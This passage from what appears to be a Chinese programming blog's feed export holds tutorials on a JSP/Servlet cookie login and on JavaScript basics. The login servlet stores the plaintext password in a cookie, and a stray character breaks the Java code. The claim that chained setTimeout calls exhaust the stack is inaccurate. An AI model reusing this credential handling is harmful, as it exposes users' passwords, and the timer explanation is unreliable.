class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;%=username%&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"&lt;%=password%&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登陆"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建<code>Servlet</code>，处理<code>post</code>请求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Yalexin</span></span><br><span class="line"><span class="comment"> * Email: 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">package</span> com.yalexin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(urlPatterns = <span class="string">"/login_1"</span>, name = <span class="string">"Login_1Servlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login_1Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String username = req.getParameter(<span class="string">"username"</span>).trim();</span><br><span class="line">        String password = req.getParameter(<span class="string">"password"</span>).trim();</span><br><span class="line">        saveCookie(resp, <span class="string">"userCookie"</span>, username + <span class="string">"-&gt;"</span> + password, <span class="number">60</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">this</span>.getServletContext().setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        resp.sendRedirect(<span class="string">"index_1.jsp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">saveCookie</span><span class="params">(HttpServletResponse response, String cookieName, String value, <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(cookieName, value);】</span><br><span class="line">        <span class="comment">// 以秒为单位</span></span><br><span class="line">        cookie.setMaxAge(time);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建登陆成功后的页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%--</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Author:</span> <span class="attr">Yalexin</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Email:</span> <span class="attr">181303209</span>@<span class="attr">yzu.edu.cn</span> </span></span><br><span class="line"><span class="tag"><span class="attr">--</span>%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello $&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"logout_1"</span>&gt;</span> 注销 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建注销<code>Servlet</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Yalexin</span></span><br><span class="line"><span class="comment"> * Email: 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">package</span> com.yalexin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(urlPatterns = <span class="string">"/logout_1"</span>, name = <span class="string">"Logout_1Servlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Logout_1Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        deleteCookieByName(resp, req, <span class="string">"userCookie"</span>);</span><br><span class="line">        resp.sendRedirect(<span class="string">"login_1.jsp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 由于没有提供delete方法，可借助 cookie.setMaxAge(0) 将cookie的时间设置成0，即过期状态，间接达到删除目的</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cookieName</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">deleteCookieByName</span><span class="params">(HttpServletResponse response, HttpServletRequest request, String cookieName)</span> </span>&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(cookieName, <span class="string">""</span>);</span><br><span class="line">        cookie.setMaxAge(<span class="number">0</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Jsp</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript语法一</title>
    <url>/2020/03/09/JavaScript%E8%AF%AD%E6%B3%95%E4%B8%80/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新，交互式的地图，2D/3D 动画，滚动播放的视频等等。构建web前端，JavaScript 怎能缺席。它是标准 Web 技术蛋糕的第三层，其中 <a href="https://ruixin_huang.gitee.io/mblog/2020/03/07/html%E8%AF%AD%E6%B3%951/" target="_blank" rel="noopener">HTML </a>和 <a href="https://ruixin_huang.gitee.io/mblog/2020/03/08/css-%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">CSS </a>我们已经在前面有了初步学习。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>前面学习CSS中，我们知道CSS的使用方法有三种：元素内嵌、文档内嵌、导入外部。这里的JavaScript也有类似的方法：元素内嵌、文档内嵌、导入外部：</p>
<a id="more"></a>

<ul>
<li><p>元素内嵌</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"这是一个按钮"</span> <span class="attr">onclick</span>=<span class="string">"alert('你好')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>文档内嵌</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">"hello world"</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>导入外部</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新建一个test.js</span></span><br><span class="line">alert(<span class="string">"test"</span>);</span><br><span class="line"><span class="comment">//在HTML文件中的head标签下引入</span></span><br><span class="line">&lt;script src=<span class="string">"test.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="输出内容"><a href="#输出内容" class="headerlink" title="输出内容"></a>输出内容</h2><p>可以用alert()函数或者document.write()，这前者是弹出式，后者直接在网页中显示，还可以配合标签来使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> title = <span class="string">"这是一级标题"</span>;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">"&lt;h1&gt;"</span>+title+<span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>还有用console.log()在控制台控制输出，一般用于程序员调试。</p>
<h2 id="输入内容"><a href="#输入内容" class="headerlink" title="输入内容"></a>输入内容</h2><p>获取用户输入，我们在HTML的表单中已经学习过，如果用JavaScript也可以实现，prompt()方法用于显示一个带有提示信息，并且用户可以输入的对话框。 </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">prompt(text,defaultText);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>可选。要在对话框中显示的提示信息（纯文本）</td>
</tr>
<tr>
<td>defaultText</td>
<td>可选。默认的输入文本。</td>
</tr>
</tbody></table>
<p>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var inPut &#x3D; prompt(&quot;请输入你的内容&quot;,&quot;&quot;);</span><br><span class="line">	alert(&quot;您输出的是\n&quot;+inPut);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>JavaScript跟其他面向对象语言一样，有对象的属性，关于详细的面向对象，<a href="[https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/24792?fromtitle=%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B&fromid=254878](https://baike.baidu.com/item/面向对象程序设计/24792?fromtitle=面向对象编程&fromid=254878)">这里</a>有着详细的介绍</p>
<ul>
<li><p>使用对象字面量创建对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> student = &#123;</span><br><span class="line">    ID: <span class="number">11111111</span>,</span><br><span class="line">    name: <span class="string">"学生名字"</span>,</span><br><span class="line">    age: <span class="number">18</span>,</span><br><span class="line">    sayHello: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 两种方法引用对象属性 */</span></span><br><span class="line">alert(student.ID);</span><br><span class="line">alert(student[<span class="string">"ID"</span>]);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>使用new object()方式创建</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> <span class="built_in">Object</span>(); <span class="comment">//创建了一个空对象</span></span><br><span class="line">student.ID = <span class="number">123</span>;</span><br><span class="line">student.name = <span class="string">"学生姓名"</span>;</span><br><span class="line">student.age = <span class="number">18</span>;</span><br><span class="line">student.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>利用构造函数方式创建</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Creatstudent</span>(<span class="params">s_ID,s_name,s_age</span>)</span>&#123; <span class="comment">//构造函数名一般首字母大写</span></span><br><span class="line">    <span class="keyword">this</span>.ID = s_ID;</span><br><span class="line">    <span class="keyword">this</span>.name = s_name;</span><br><span class="line">    <span class="keyword">this</span>.age = s_age;</span><br><span class="line">    <span class="keyword">this</span>.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有返回值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> Creatstudent(<span class="number">12345</span>,<span class="string">"学生姓名"</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="遍历对象的内容"><a href="#遍历对象的内容" class="headerlink" title="遍历对象的内容"></a>遍历对象的内容</h2><p>有的时候我们想获取对象的全部属性，我们可以用对象+“.”+属性名来获取，这种方法对于属性少的对象来说固然奏效，但是假如我的对象有一千个、一万个属性呢？（当然了这只是一个假设，我们自定义的对象一般不会有这么多的属性吧）上面的方法估计就有些吃力了吧！因此我们需要换一种方式来遍历。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> key;</span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> student)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key+<span class="string">":"</span>); <span class="comment">//循环一次 得到的是属性名</span></span><br><span class="line">    <span class="comment">// console.log(student.key); 不得使用该方法 因此该方法返回的是undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(student[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><ul>
<li><p>JavaScript中对象分为三种：自定义对象、内置对象、浏览器对象。</p>
</li>
<li><p>前面两种对象属于ECMAScript，第三个是JavaScript独有的</p>
</li>
<li><p>内置对象是官方定义，供开发人员使用的对象，它能帮助开发者快速开发，而不必要在意背后的工作原理（当然了喜欢钻研也可以）。</p>
</li>
<li><p>JavaScript提供了大量的内置对象，如Math、Date、Array、String等。</p>
</li>
<li><p>为了了解如何使用内置对象，我们需要去<a href="https://developer.mozilla.org/zh-CN/" target="_blank" rel="noopener">官网</a>查阅官方文档，例如，根据官方文档，我们可以知道获取时间的方法是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    nowtime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    year = nowtime.getFullYear();</span><br><span class="line">    month = nowtime.getMonth() + <span class="number">1</span>;</span><br><span class="line">    date = nowtime.getDate();</span><br><span class="line">    <span class="built_in">console</span>.log(year + <span class="string">"年"</span> + month + <span class="string">"月"</span> + date + <span class="string">"日"</span> + nowtime.toLocaleTimeString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 更新时间间隔</span></span><br><span class="line">setInterval(<span class="string">"showTime()"</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript语法三</title>
    <url>/2020/03/16/JavaScript%E8%AF%AD%E6%B3%95%E4%B8%89/</url>
    <content><![CDATA[<h2 id="js对象控制CSS"><a href="#js对象控制CSS" class="headerlink" title="js对象控制CSS"></a>js对象控制CSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        p &#123;</span><br><span class="line">            color: brown;</span><br><span class="line">            width: fit-content;</span><br><span class="line">            height: auto;</span><br><span class="line">            background-color: aquamarine;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p_id"</span>&gt;</span>这是一段测试的文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"change()"</span>&gt;</span>改变背景颜色<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"p_id"</span>).style.backgroundColor = <span class="string">"#ffffff"</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>其他的效果类似，方法都是先找到要改变的元素，然后设置新的CSS样式。</p>
<h2 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h2><h3 id="1-计时事件"><a href="#1-计时事件" class="headerlink" title="1.计时事件"></a>1.计时事件</h3><p>通过JavaScript，我们可以在一个需要的时间间隔之后执行我们的任务，而不是在函数被调用后立即执行，我们称之为计时事件。</p>
<h3 id="2-计时方法"><a href="#2-计时方法" class="headerlink" title="2.计时方法"></a>2.计时方法</h3><ol>
<li><p>setInterval(code,millisec[,”lang”])：间隔指定的毫秒数不停地执行指定的代码</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">code</td>
<td align="left">必需。要调用的函数或要执行的代码串。</td>
</tr>
<tr>
<td align="left">millisec</td>
<td align="left">必须。周期性执行或调用 code 之间的时间间隔，以毫秒计。</td>
</tr>
</tbody></table>
<p>例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time_p"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> demo_time = setInterval( <span class="string">"getTime()"</span>,<span class="number">1000</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> nowTime = nowDate.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"time_p"</span>).innerHTML = nowTime;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那我们想要停止执行怎么办？用下面这个方法就可以了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">clearInterval(demo_time);</span><br></pre></td></tr></table></figure>
</li>
<li><p>setTimeout(code,millisec[,”lang”])：延迟指定的毫秒数后执行指定的代码   </p>
<p>例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo_time = setTimeout( <span class="string">"getTime()"</span>,<span class="number">1000</span>);<span class="comment">//一秒后执行一次getTime()</span></span><br></pre></td></tr></table></figure>

<p>虽然说是执行一次，但是我们可以利用递归进行不断调用，从而实现setInterval()类似的效果，如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time_p"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"stop_time()"</span>&gt;</span>停止计时<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> demo_time;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> nowTime = nowDate.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"time_p"</span>).innerHTML = nowTime;</span></span><br><span class="line"><span class="actionscript">        demo_time = setTimeout( <span class="string">"getTime()"</span>,<span class="number">3000</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">stop_time</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">        clearTimeout(demo_time);</span><br><span class="line">    &#125;</span><br><span class="line">    getTime();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是”可以“并不代表着推荐这么做，想想调用函数的本质是什么？不就是压栈吗？我们永不断地进行压栈，而没有弹栈，计算机的资源不久就会被消耗殆尽。因此，对于周期性的工作，我们还是 强烈推荐使用setInterval()方法。</p>
</li>
</ol>
<h2 id="利用screen对象获取屏幕信息"><a href="#利用screen对象获取屏幕信息" class="headerlink" title="利用screen对象获取屏幕信息"></a>利用screen对象获取屏幕信息</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> a_height = screen.availHeight;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> a_width = screen.availWidth;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> height = screen.height;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> width = screen.width;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"可用的屏幕高度："</span>+a_height</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\n可用的屏幕宽度："</span>+a_width</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\n屏幕的高度："</span>+height</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\n屏幕的宽度："</span>+width);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript语法二</title>
    <url>/2020/03/15/JavaScript%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h2><ul>
<li><p>window对象是BOM的核心，window对象指当前的浏览器窗口</p>
</li>
<li><p>所有JavaScript全局对象、函数以及变量均自动成为window对象的成员</p>
</li>
<li><p>全局变量是window对象的属性</p>
</li>
<li><p>全局函数是window对象的方法<a id="more"></a></p>
</li>
<li><p>甚至HTML DOM的document也是window对象的属性之一</p>
</li>
<li><p>window.innerHeight ：浏览器窗口的内部高度</p>
</li>
<li><p>window.innerWidth ：浏览器窗口的内部宽度</p>
</li>
<li><p>打开一个window窗口:windows.open()</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">URL</td>
<td align="left">一个可选的字符串，声明了要在新窗口中显示的文档的 URL。如果省略了这个参数，或者它的值是空字符串，那么新窗口就不会显示任何文档。</td>
</tr>
<tr>
<td align="left">name</td>
<td align="left">一个可选的字符串，该字符串是一个由逗号分隔的特征列表，其中包括数字、字母和下划线，该字符声明了新窗口的名称。如果该参数指定了一个已经存在的窗口，那么 open() 方法就不再创建一个新窗口，而只是返回对指定窗口的引用。在这种情况下，features 将被忽略。</td>
</tr>
<tr>
<td align="left">features</td>
<td align="left">一个可选的字符串，声明了新窗口要显示的标准浏览器的特征。如果省略该参数，新窗口将具有所有标准特征。在<a href="https://www.w3school.com.cn/jsref/met_win_open.asp#windowfeatures" target="_blank" rel="noopener">窗口特征</a>这个表格中，我们对该字符串的格式进行了详细的说明。</td>
</tr>
<tr>
<td align="left">replace</td>
<td align="left">一个可选的布尔值。规定了装载到窗口的 URL 是在窗口的浏览历史中创建一个新条目，还是替换浏览历史中的当前条目。支持下面的值：<br>true - URL 替换浏览历史中的当前条目。<br>false - URL 在浏览历史中创建新的条目。</td>
</tr>
</tbody></table>
<ul>
<li><p>关闭一个window窗口:windows.close()</p>
